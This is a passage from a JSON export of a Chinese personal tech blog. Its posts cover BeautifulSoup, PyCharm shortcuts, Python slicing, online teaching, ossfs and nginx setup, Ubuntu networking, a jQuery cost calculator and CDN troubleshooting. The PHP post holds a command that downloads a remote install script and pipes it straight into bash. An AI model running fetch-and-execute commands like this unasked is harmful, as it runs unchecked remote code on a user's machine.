page&lt;/title&gt;] &gt;&gt;&gt; soup.body.contents [u&apos;\\n&apos;, &lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;, u&apos;\\n&apos;, &lt;p class=&quot;course&quot;&gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:\\r\\n&lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt; and &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;, u&apos;\\n&apos;] &gt;&gt;&gt; &gt;&gt;&gt; len(soup.body.contents) 5 &gt;&gt;&gt; soup.body.contents[1] &lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;方法 .contents .children .desendants 需要配合for语句使用 上行遍历 &gt;&gt;&gt; soup.body.parent &lt;html&gt;&lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt;\\n&lt;body&gt;\\n&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;\\n&lt;p class=&quot;course&quot;&gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:\\r\\n&lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt; and &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;\\n&lt;/body&gt;&lt;/html&gt;标签书上行遍历 方法 .parent .parents 平行遍历 获取下一个标签 &gt;&gt;&gt; soup.a.next_sibling u&apos; and &apos; &gt;&gt;&gt; soup.a.next_sibling.next_sibling &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;获取前一个阶段 &gt;&gt;&gt; soup.a.previous_sibling u&apos;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:\\r\\n&apos; 方法 .next_sibling .previous_sibling .next_siblings .previous_siblings 更友好的显示内容&gt;&gt;&gt; soup.prettify() u&apos;&lt;html&gt;\\n &lt;head&gt;\\n &lt;title&gt;\\n This is a python demo page\\n &lt;/title&gt;\\n &lt;/head&gt;\\n &lt;body&gt;\\n &lt;p class=&quot;title&quot;&gt;\\n &lt;b&gt;\\n The demo python introduces several python courses.\\n &lt;/b&gt;\\n &lt;/p&gt;\\n &lt;p class=&quot;course&quot;&gt;\\n Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:\\n &lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;\\n Basic Python\\n &lt;/a&gt;\\n and\\n &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;\\n Advanced Python\\n &lt;/a&gt;\\n .\\n &lt;/p&gt;\\n &lt;/body&gt;\\n&lt;/html&gt;&apos; &gt;&gt;&gt; print(soup.prettify()) &lt;html&gt; &lt;head&gt; &lt;title&gt; This is a python demo page &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p class=&quot;title&quot;&gt; &lt;b&gt; The demo python introduces several python courses. &lt;/b&gt; &lt;/p&gt; &lt;p class=&quot;course&quot;&gt; Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses: &lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt; Basic Python &lt;/a&gt; and &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt; Advanced Python &lt;/a&gt; . &lt;/p&gt;** &lt;/body&gt; &lt;/html&gt; &gt;&gt;&gt; print(soup.a.prettify()) &lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt; Basic Python &lt;/a&gt;#bs4 库的基本元素 tag 标签 name 名字 -attributes 标签属性 navigablestring 标签之间的字符串 comment 注释 本文内容来自网易云课堂","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"Pycharm快捷键","slug":"Pycharm快捷键","date":"2017-07-10T04:46:39.000Z","updated":"2021-02-26T06:05:29.262Z","comments":true,"path":"posts/1883635420.html","link":"","permalink":"https://awen.me/posts/1883635420.html","excerpt":"工欲善其事，必先利其器，使用工具一定要先了解工具如何使用，在写 python 代码的时候，总结下 pycharm 在 mac 下的常用快捷键","text":"工欲善其事，必先利其器，使用工具一定要先了解工具如何使用，在写 python 代码的时候，总结下 pycharm 在 mac 下的常用快捷键 cmd b 跳转到声明处（cmd加鼠标） opt + 空格 显示符号代码 （esc退出窗口 回车进入代码） cmd []光标之前/后的位置 opt + F7 find usage cmd backspace 删除当前行 cmd +c 复制光标当前行,剪切同理 cmd + f 当前文件搜索（回车下一个 shift回车上一个） cmd + r 当前文件替换 shift + cmd + f 全局搜索 shift + cmd + R 全局替换 cmd+o 搜索class shift + cmd + o 搜索文件 opt + cmd + o 搜索符号（函数等) cmd + l 指定行数跳转 shift enter 在行中的时候直接到下一行 cmd + 展开当前 cmd - 折叠当前 shift cmd + 展开所有 shift cmd - 折叠所有 cmd / 注释/取消注释一行 opt + cmd + / 批量注释(pycharm不生效) ctr + tab 史上最NB的导航窗口（工程文件列表、文件结构列表、命令行模式、代码检查、VCS等，下面两个是可以被替换的） alt + F12 打开命令行栏 cmd + F12 显示文件结构 cmd j 代码智能补全 alt + F1 定位编辑文件所在位置: cmd + F6 更改变量 opt + cmd + t 指定代码被注释语句或者逻辑结构、函数包围 Tab / Shift + Tab 缩进、不缩进当前行 opt + cmd + l 代码块对齐 cmd+d 在下一行复制本行的内容","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"网易云跟帖再见，DISQUS我来了","slug":"网易云跟帖再见，DISQUS我来了","date":"2017-07-10T04:46:39.000Z","updated":"2021-02-26T06:05:29.353Z","comments":true,"path":"posts/1460503930.html","link":"","permalink":"https://awen.me/posts/1460503930.html","excerpt":"","text":"既多说关闭后，又一家评论平台关闭，今天早上收到网易的邮件，哥我才使用没2个月好么，好吧，还是换会DISQUS，不过就是加载速度慢点。","categories":[],"tags":[{"name":"网易","slug":"网易","permalink":"https://awen.me/tags/%E7%BD%91%E6%98%93/"}]},{"title":"Python切片","slug":"Python切片","date":"2017-07-10T04:30:36.000Z","updated":"2021-02-26T06:05:29.264Z","comments":true,"path":"posts/2319155104.html","link":"","permalink":"https://awen.me/posts/2319155104.html","excerpt":"切片python 的切片功能，可以让我们非常方便的按照索引的下标编号获取对应的值，举个例子打印0-100个数","text":"切片python 的切片功能，可以让我们非常方便的按照索引的下标编号获取对应的值，举个例子打印0-100个数 ➜ ~ python Python 2.7.13 (v2.7.13:a06454b1afa1, Dec 17 2016, 12:39:47) [GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; L = range(100) &gt;&gt;&gt; L [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99]例子我们现在要取前9个，那么通过切片，我看可以输入 &gt;&gt;&gt; L[:9] [0, 1, 2, 3, 4, 5, 6, 7, 8]或者 &gt;&gt;&gt; L[0:9] [0, 1, 2, 3, 4, 5, 6, 7, 8][] 中用:隔开，前面表示从0开始的索引位置，后面表示截止的索引位置，那么比如说我们希望取最后9个数，则是这样的 &gt;&gt;&gt; L[-9:] [91, 92, 93, 94, 95, 96, 97, 98, 99]那么我们要取中间的数，则 &gt;&gt;&gt; L[50:60] [50, 51, 52, 53, 54, 55, 56, 57, 58, 59]小程序看一个温度转换的工具 #!/usr/bin/python #-*-coding:utf-8-*- #Auth:awen #Date: 2017.07.10 # input 等待用户输入 val = input(&quot;请输入带温度表示符号的温度值，（例如:32c）:&quot;) #如果 val 最后一位输入的是 c 或 C 则转换为华氏度，[-1]是 Python 中的切片,[-1]表示最倒数第一位的值 if val[-1] in [&apos;c&apos;,&apos;C&apos;]: print(val[0:-1]) f = 1.8* float(val[0:-1]) + 32 print(&quot;转换后的温度为: %.2fF 摄氏度(℃)&quot;%f) elif val[-1] in [&apos;F&apos;,&apos;f&apos;]: c = (float(val[0:-1])-32)/1.8 print(&quot;转换后的温度为:%.2fC 华氏度(℉)&quot;%c) else: print(&quot;输入有误&quot;)结果如下","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"极客学院布道师体验","slug":"极客学院布道师体验","date":"2017-07-09T22:13:02.000Z","updated":"2021-02-26T06:05:29.342Z","comments":true,"path":"posts/627899599.html","link":"","permalink":"https://awen.me/posts/627899599.html","excerpt":"前几天，极客学院的对接人李静找到我，说合同到期了，要不要继续续签，我拒绝了，回想15年，我在网上瞎溜达，发现极客学院有在招讲师。当时就想去试一试，因为平时都是听别人在网上讲课，有些讲师讲的课其实是挺好的。比如我当年学 Linux，苏老师的视频就非常适合入门学习，视频清晰、无杂音、让你沉醉在学习听课中。我想趁着这个机会，可以锻炼下自己的视频录制和解说等技巧，于是就报名了。","text":"前几天，极客学院的对接人李静找到我，说合同到期了，要不要继续续签，我拒绝了，回想15年，我在网上瞎溜达，发现极客学院有在招讲师。当时就想去试一试，因为平时都是听别人在网上讲课，有些讲师讲的课其实是挺好的。比如我当年学 Linux，苏老师的视频就非常适合入门学习，视频清晰、无杂音、让你沉醉在学习听课中。我想趁着这个机会，可以锻炼下自己的视频录制和解说等技巧，于是就报名了。 线上教育模式是什么样学院的对接人和我联系，首先了解了所要授课的方向，并且告知授课的一些要求，大概是这样的，然后我录制的课程是思科的基础课程 CCNA： 1.首先是按照他们的要求和录制技巧录制完课程，上传到平台，平台提供标准的 PPT 模板，全网都是统一的，然后提供麦克，他们提供的麦克扛噪音强，即使外面的声音在吵，录制完的视频里也不会有杂音，然后由平台工作人员审核课程是否录制过关，对于他们觉得不足的地方进行讨论是否有必要修改或重录。2.然后等待他们的剪辑上后期处理，比如加个片头呀，对视频的剪辑，控制视频的时长和节奏。其实，大部分时候我录制完的视频都不需要他们过多的处理，因为我本地录制完基本就已经把说的不好的地方或者停顿过多的过多的地方剪掉。3.最后上线课程，付我薪水，极客当时是一小时2000人民币，但是制作 PPT、录制、剪辑花费的时间远远超过1小时。特别是有时候重录时间就更久了。4.学生注册平台账号进行付费学习。 线上讲师的体验1.觉得这种模式有点像流水线一样产出视频。流程化的生产，对于视频的时长有严格限制，比如不能超过60分钟，每小节不能超过20分钟甚至更短，因为考虑大部分人都是碎片化时间学习，时间太长人看不下去。所以这个设定还是很合理的。此外，在讲解过程中要保证节奏，比如该停顿的地方要停顿，语速要掌握好。但是有一点就是讲师要把知识点浓缩了，否则时间是不够的。我讲的 CCNA，在线下培训都要5天，每天7小时老师不停的讲。但是线上就要浓缩重点而不是所有的都讲。 2.其次，在录制过程中，不会像传统线下讲师授课那样，老师废话特别多。有时候一节课1小时的视频，只有三分之一讲了实际的技术，其他时间都是在扯淡，我就听过这样的老师录的视频。 3.麦克要好，这个很重要，如果麦克音质隔音效果差，学生听课根本集中不了注意力。 4.录制视频要掌握录制软件的使用技巧等，比如在重点地方的时候可以放大，这样可以引人注意，该标注的地方后期要标注好。 线下和线上的区别线上教育优点1.学生可以随时随地听课。老师可以自由安排时间录课，不用集中在周末去培训机构上课，学生也一样，节省时间成本。 2.平台省去了大量的线下支出，比如采购电脑、桌椅板凳、投影等等支出，但是这部分支出体现到了线上的服务器、带宽、存储、以及开发人员的工资等。3.学生可以提前在线试听老师课程，满意后在付费。4.学生支出相比较线下少一半以上。 缺点3.效果可能没线下好，由于对着屏幕，老师的言谈举止其实学生是看不见的，并且缺乏与学生互动，学生一个人在家学习，效果无法跟踪。不过目前他们有改进，加上学习跟踪。不知道效果如何。 线下教育缺点1.时间支出大，老师，学生都要花费平均1小时以上时间在通勤上，我记得14年我参加培训从萧山到市区，1个多小时的车程。 2.老师授课质量无法提前预知。必须是报名后才可以听，虽然有试听，但是一节课听不出什么效果的。 3.线下支出费用多，教室、桌椅、投影、饮水机、环境布置等等。 优点1.有一群志同道合的小伙伴一起学习，氛围会好很多。2.如果遇到好老师，学习效果会很不错。 我得到了什么1.一些录制视频的技巧，剪辑技巧、讲解技巧。2.一笔丰厚的报酬。3.自己也参加过线下和线上的培训，对比下还是线上好。省时，随时随地学。 线下教育的真实成本学费+住宿费+吃饭+你要是上班拿的工资 = 实际成本有的线下脱产学费很贵，比如某 java 培训，16800 分期的话估计也要2w。假设脱产学，学费16800，你一次性付清，住宿费一个月假设800，在杭州这种地方很便宜了，吃饭一个月1000，你4个月如果上班，假设可以拿到薪水每月5000，那么就是 16800+3200+4000+20000 = 4400044000才是你的真实付出成本，你自己算下你线下脱产学，多久能把这个成本赚回来。如果你拿着44000 去干其他的，收益会比你培训高吗？这要自己掂量。","categories":[],"tags":[{"name":"心得","slug":"心得","permalink":"https://awen.me/tags/%E5%BF%83%E5%BE%97/"}]},{"title":"Linux上挂载阿里云OSS","slug":"Linux上挂载阿里云OSS","date":"2017-07-08T13:35:55.000Z","updated":"2021-02-26T06:05:29.258Z","comments":true,"path":"posts/3350445710.html","link":"","permalink":"https://awen.me/posts/3350445710.html","excerpt":"有一个需求，我希望自己建一个目录页，类似网易开源镜像站那样的。把平时用到的软件包丢过去，有需要就去下载，走个 CDN 加速下载会比较快点，但是阿里云的服务器，没有数据盘，因为我也用不着，所以如果直接扔系统，可能系统挂了，这些东西就没了。于是想着是不是可以把云存储直接挂在到系统上使用呢？万能的谷歌一搜，发现阿里云的 OSS 还真有。","text":"有一个需求，我希望自己建一个目录页，类似网易开源镜像站那样的。把平时用到的软件包丢过去，有需要就去下载，走个 CDN 加速下载会比较快点，但是阿里云的服务器，没有数据盘，因为我也用不着，所以如果直接扔系统，可能系统挂了，这些东西就没了。于是想着是不是可以把云存储直接挂在到系统上使用呢？万能的谷歌一搜，发现阿里云的 OSS 还真有。 安装 ossfs参考 GitHub 1.首先，创建一个和阿里云服务器在同一地区的 OSS，这样挂在内网写入还能免流量费。 2.去这里下载对应系统的包，我这里是 Ubuntu 3.然后安装 wget -c https://github.com/aliyun/ossfs/releases/download/v1.80.2/ossfs_1.80.2_ubuntu14.04_amd64.deb sudo apt-get update sudo apt-get install gdebi-core sudo gdebi ossfs_1.80.2_ubuntu14.04_amd64.deb4.将 accesskey 和 id写入到/etc/passwd-ossfs，并赋予其640权限 echo my-bucket:my-access-key-id:my-access-key-secret &gt; /etc/passwd-ossfs chmod 640 /etc/passwd-ossfs5.我直接挂在到/etc/fstab ossfs#bucket /ftp/ fuse _netdev,url=https://oss-cn-qingdao-internal.aliyuncs.com,allow_other 0 05.跳过系统扫描目录 可以通过修改/etc/updatedb.conf让它跳过 1. 在`PRUNEFS = `后面加上`fuse.ossfs` 2. 在`PRUNEPATHS = `后面加上挂载的目录 nginx 配置下打开目录location /ftp/ { autoindex on; }最终效果 考虑只有自己用，加个密码吧 apt-get install apache2-utils然后 root@aliyun:/usr/local/nginx/conf/vhost/auth# htpasswd -b -c /usr/local/nginx/conf/vhost/auth/admin.pass username passwd Adding password for user adminnginx 修改为 location ~ ^/ftp/.* { auth_basic &quot;auth&quot;; auth_basic_user_file /usr/local/nginx/conf/vhost/auth/admin.pass; autoindex on; } location ~ ^/ftp/ 表示针对该目录下所有文件都进行保护。","categories":[],"tags":[{"name":"阿里云","slug":"阿里云","permalink":"https://awen.me/tags/%E9%98%BF%E9%87%8C%E4%BA%91/"}]},{"title":"Ubuntu新增网卡无法获取IP","slug":"Ubuntu新增网卡无法获取IP","date":"2017-07-08T06:10:40.000Z","updated":"2021-02-26T06:05:29.267Z","comments":true,"path":"posts/1995361525.html","link":"","permalink":"https://awen.me/posts/1995361525.html","excerpt":"Ubuntu server 新添加一个虚拟网卡，发现默认不显示 IP","text":"Ubuntu server 新添加一个虚拟网卡，发现默认不显示 IP root@ubuntu:/etc/udev/rules.d# ifconfig -a ens33 Link encap:Ethernet HWaddr 00:0c:29:de:e9:be inet addr:192.168.1.144 Bcast:192.168.1.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fede:e9be/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:2688 errors:0 dropped:0 overruns:0 frame:0 TX packets:2463 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 TXqueuelen:1000 RX bytes:273797 (273.7 KB) TX bytes:256048 (256.0 KB) ens38 Link encap:Ethernet HWaddr 00:0c:29:de:e9:c8 BROADCAST MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 TXqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:2207 errors:0 dropped:0 overruns:0 frame:0 TX packets:2207 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 TXqueuelen:1 RX bytes:197918 (197.9 KB) TX bytes:197918 (197.9 KB)解决办法编辑 root@ubuntu:/etc/udev/rules.d# cat /etc/network/interfaces # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). source /etc/network/interfaces.d/* # The loopback network interface auto lo iface lo inet loopback # The primary network interface auto ens33 iface ens33 inet dhcp auto ens38 iface ens38 inet dhcp重启网卡 fwj@ubuntu:~$ ifconfig ens33 Link encap:Ethernet HWaddr 00:0c:29:de:e9:be inet addr:192.168.1.144 Bcast:192.168.1.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fede:e9be/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:74 errors:0 dropped:0 overruns:0 frame:0 TX packets:90 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:8685 (8.6 KB) TX bytes:10695 (10.6 KB) ens38 Link encap:Ethernet HWaddr 00:0c:29:de:e9:c8 inet addr:172.10.100.131 Bcast:172.10.100.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fede:e9c8/64 Scope:Link inet6 addr: fd15:4ba5:5a2b:1008:20c:29ff:fede:e9c8/64 Scope:Global UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:11 errors:0 dropped:0 overruns:0 frame:0 TX packets:12 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:1354 (1.3 KB) TX bytes:1452 (1.4 KB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:222 errors:0 dropped:0 overruns:0 frame:0 TX packets:222 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1 RX bytes:22102 (22.1 KB) TX bytes:22102 (22.1 KB)","categories":[],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://awen.me/tags/Ubuntu/"}]},{"title":"MAC配置php环境","slug":"MAC配置php环境","date":"2017-07-07T15:45:17.000Z","updated":"2021-02-26T06:05:29.258Z","comments":true,"path":"posts/1044808697.html","link":"","permalink":"https://awen.me/posts/1044808697.html","excerpt":"安装 php如果需要安装最新的 php,去这里https://php-osx.liip.ch/","text":"安装 php如果需要安装最新的 php,去这里https://php-osx.liip.ch/ 比如，安装7.1 curl -s https://php-osx.liip.ch/install.sh | bash -s 7.1然后配置环境变量 export PATH=/usr/local/php5/bin:$PATHphpstorm 加载解析器 然后创建一个 php 文件 效果 此外发现新版的 phpstorm 还支持 vagrant ssh docker 等","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://awen.me/tags/PHP/"}]},{"title":"javascript中保留小数位","slug":"javascript中保留小数位","date":"2017-07-07T00:23:35.000Z","updated":"2021-02-26T06:05:29.274Z","comments":true,"path":"posts/247353623.html","link":"","permalink":"https://awen.me/posts/247353623.html","excerpt":"昨天给部门做一个直播价格计费工具，两年没碰过前端的东西了。着实的生疏。不过好在还没忘记 jQuery 的语法，琢磨了一下，还是写了出来。不过在最终计算的时候，发现计算结果有点问题，主要是希望能保留2位小数，搜索下发现 JavaScript 有一个 toFixed 函数可以操作，具体如下：","text":"昨天给部门做一个直播价格计费工具，两年没碰过前端的东西了。着实的生疏。不过好在还没忘记 jQuery 的语法，琢磨了一下，还是写了出来。不过在最终计算的时候，发现计算结果有点问题，主要是希望能保留2位小数，搜索下发现 JavaScript 有一个 toFixed 函数可以操作，具体如下： $(document).ready(function(){ $(&quot;#M,#N,#T&quot;).change(function(){ var ism = $(&quot;#M&quot;).val(); var isn = $(&quot;#N&quot;).val(); var ist = $(&quot;#T&quot;).val(); console.log(ism); console.log(isn); console.log(ist); var sum = (ism/8)*(ist*60)*isn/1024/1024*0.43; console.log(sum); $(&quot;#count&quot;).html(sum.toFixed(2)); }); });最终得到的结果 其中，sum.toFixed(2)就是在获取到值之后保留2位小数，toFixed 可以对第三位进行四舍五入。达到了我的最终需求。恩，抽空要复习复习前端的东西了。 html&lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;title&gt;直播流量计算&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/index.css&quot;&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/index.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;div class=&quot;logo&quot;&gt;&lt;img src=&quot;images/168-50.png&quot;&gt;&lt;/div&gt; &lt;div class=&quot;man&quot;&gt; &lt;div class=&quot;man_top&quot;&gt; &lt;p&gt;&lt;h1&gt;按流量计费&lt;/h1&gt;&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;man_content&quot;&gt; &lt;dir class=&quot;table&quot; &gt; &lt;table border=&quot;0&quot;&gt; &lt;tr&gt; &lt;td&gt;视频码率&amp;nbsp;M&lt;/td&gt; &lt;td&gt; &lt;select id=&quot;M&quot; name=&quot;M&quot;&gt; &lt;option value=&quot;2560&quot;&gt;超清1080P（2560kbps）&lt;/option&gt; &lt;option value=&quot;1152&quot;&gt;高清720P（1152kbps）&lt;/option&gt; &lt;option value=&quot; 512&quot; selected&gt;标清480P（512kbps）&lt;/option&gt; &lt;option value=&quot;256&quot;&gt;低清240P（256kbps）&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;观看并发数&amp;nbsp;N&lt;/td&gt; &lt;td&gt; &lt;select id=&quot;N&quot; name=&quot;N&quot;&gt; &lt;option value=&quot;10000&quot;&gt;10000人&lt;/option&gt; &lt;option value=&quot;1000&quot;&gt;1000人&lt;/option&gt; &lt;option value=&quot;500&quot;&gt;500人&lt;/option&gt; &lt;option value=&quot;200&quot;&gt;200人&lt;/option&gt; &lt;option value=&quot;100&quot; selected&gt;100人&lt;/option&gt; &lt;option value=&quot;50&quot;&gt;50人&lt;/option&gt; &lt;option value=&quot;10&quot;&gt;10人&lt;/option&gt; &lt;option value=&quot;1&quot;&gt;1人&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;播放时长&amp;nbsp;T&lt;/td&gt; &lt;td&gt; &lt;select id=&quot;T&quot; name=&quot;T&quot;&gt; &lt;option value=&quot;1440&quot;&gt;24小时&lt;/option&gt; &lt;option value=&quot;960&quot;&gt;16小时&lt;/option&gt; &lt;option value=&quot;480&quot;&gt;8小时&lt;/option&gt; &lt;option value=&quot;240&quot;&gt;4小时&lt;/option&gt; &lt;option value=&quot;180&quot;&gt;3小时&lt;/option&gt; &lt;option value=&quot;120&quot;&gt;2小时&lt;/option&gt; &lt;option value=&quot;60&quot; selected&gt;1小时&lt;/option&gt; &lt;option value=&quot;30&quot;&gt;30分钟&lt;/option&gt; &lt;option value=&quot;1&quot;&gt;1分钟&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;直播费用&amp;nbsp;&lt;/td&gt; &lt;td&gt; &lt;label id=&quot;count&quot; &gt;9.45&lt;/label&gt;元 &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;span class=&quot;info&quot;&gt;&lt;b&gt;计算公式:&amp;nbsp;&lt;/b&gt;(码率/8)*(分钟*60)*观看人数/1024/1024*0.43 比如1个人观看1小时的超清直播。其计算公式是:(2560/8)*(60*60)*1/1024/1024*0.43 =0.472元。 &lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;css.man{ margin-left: auto; margin-right: auto; width: 500px; height: 500px; border: 1px solid #5da4e5; border-radius:25px; } .man{ background-color: #1E90FF; } .man_top{ text-align: center; background-color: #1E90FF; color: #FFFFFF; } .info b{ font-size: 16px; color: #333333; } .info { font-size: 14px; color: #1E90FF; position: relative; margin: -25px; top: 200px; } .man_content{ margin-left: auto; margin-right: auto; width: 99.7%; height: 77%; padding: 1px; background-color: #FFFFFF; }js$(document).ready(function(){ $(&quot;#M,#N,#T&quot;).change(function(){ var ism = $(&quot;#M&quot;).val(); var isn = $(&quot;#N&quot;).val(); var ist = $(&quot;#T&quot;).val(); console.log(ism); console.log(isn); console.log(ist); var sum = (ism/8)*(ist*60)*isn/1024/1024*0.43; console.log(sum); $(&quot;#count&quot;).html(sum.toFixed(2)); }); });","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://awen.me/tags/JavaScript/"}]},{"title":"接客CDN之证书申请成功且解析成功，但是访问失败","slug":"证书申请成功且解析成功，但是访问失败","date":"2017-07-06T08:38:21.000Z","updated":"2021-02-26T06:05:29.357Z","comments":true,"path":"posts/3611825430.html","link":"","permalink":"https://awen.me/posts/3611825430.html","excerpt":"该客户在又拍云申请了 SSL 证书，但是访问提示如图所示 我这边先 确认了他后台已经开启了 SSL证书服务，但是查他的域名解析，是没有解析到我们这边来","text":"该客户在又拍云申请了 SSL 证书，但是访问提示如图所示 我这边先 确认了他后台已经开启了 SSL证书服务，但是查他的域名解析，是没有解析到我们这边来 ip 信息 ➜ wwwroot ip 115.231.187.232 HTTP/1.1 200 OK Connection: keep-alive Content-Length: 40 Content-Type: text/plain; charset=utf-8 Date: Thu, 06 Jul 2017 08:40:28 GMT Proxy-Connection: keep-alive Server: NewDefend X-Cache: MISS from ctl-gd-121-012-098-095 [ &quot;中国&quot;, &quot;浙江&quot;, &quot;宁波&quot;, &quot;&quot;, &quot;电信&quot; ]然后和客户确认，该客户已经将域名CNAME 到我们给的地址 和客户确认其域名解析商是哪个平台，客户说是 还用了百度的CDN。我绑定客户的域名到本地 hosts 183.158.35.60 works.njdyyy.com 然后测试，访问正常 说明是客户嵌套了多层 CDN导致了无法访问。","categories":[],"tags":[{"name":"SSL 证书","slug":"SSL-证书","permalink":"https://awen.me/tags/SSL-%E8%AF%81%E4%B9%A6/"}]},{"title":"CDN如何获取客户端真实IP","slug":"CDN如何获取客户端真实IP","date":"2017-07-06T05:44:55.000Z","updated":"2021-02-26T06:05:29.240Z","comments":true,"path":"posts/3999350847.html","link":"","permalink":"https://awen.me/posts/3999350847.html","excerpt":"通常我们接入又拍云 CDN 后，CDN 会获取源站资源缓存在 CDN，客户端请求网站资源也是直接从 CDN 边缘节点获取缓存，而非直接回源站，即使缓存失效，回源的也是 CDN 的服务器回源，那么如果我们希望获取客户端的真实 IP，我们可以在自己源站的 web 服务器加一个响应头去获取客户端的真实IP 又拍云 CDN 回客户源的时候会带上 X-Real-IP 和 X-Forwarded-For 的请求头下去，值为用户实际访问 CDN 的来源 IP 地址。特别地，为了兼容部分服务端程序，我们额外还提供了 Client-IP 请求头的支持，其值和 X-Real-IP、X-Forwarded-For 相同。","text":"通常我们接入又拍云 CDN 后，CDN 会获取源站资源缓存在 CDN，客户端请求网站资源也是直接从 CDN 边缘节点获取缓存，而非直接回源站，即使缓存失效，回源的也是 CDN 的服务器回源，那么如果我们希望获取客户端的真实 IP，我们可以在自己源站的 web 服务器加一个响应头去获取客户端的真实IP 又拍云 CDN 回客户源的时候会带上 X-Real-IP 和 X-Forwarded-For 的请求头下去，值为用户实际访问 CDN 的来源 IP 地址。特别地，为了兼容部分服务端程序，我们额外还提供了 Client-IP 请求头的支持，其值和 X-Real-IP、X-Forwarded-For 相同。 nginx配置1.在配置文件中加入 add_header 